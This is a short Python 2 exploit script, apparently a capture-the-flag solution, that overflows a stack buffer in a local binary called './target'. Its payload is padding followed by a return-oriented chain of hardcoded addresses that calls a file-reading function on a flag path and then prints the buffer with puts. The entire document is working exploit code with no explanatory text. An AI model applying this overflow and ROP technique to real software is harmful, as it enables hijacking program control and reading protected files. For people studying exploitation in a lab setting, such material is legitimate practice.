#!/usr/bin/env python2

import struct
import subprocess as sp

def p32(n):
    return struct.pack("<I", n)

ADDR_FLAG_PATH = 0x08048766
ADDR_GADGET    = 0x080486ef
ADDR_BUF       = 0x0804a080

FN_READFILE    = 0x0804859d
FN_PUTS        = 0x08048450

def get_payload():
    return "A" * (0x3a+4)     \
        + p32(FN_READFILE)    \
        + p32(ADDR_GADGET)    \
        + p32(ADDR_FLAG_PATH) \
        + p32(FN_PUTS)        \
        + 'AAAA'              \
        + p32(ADDR_BUF)       \
        + "\n"
        
if __name__ == '__main__':
    p = sp.Popen("./target", stdin=sp.PIPE)
    p.stdin.write(get_payload())
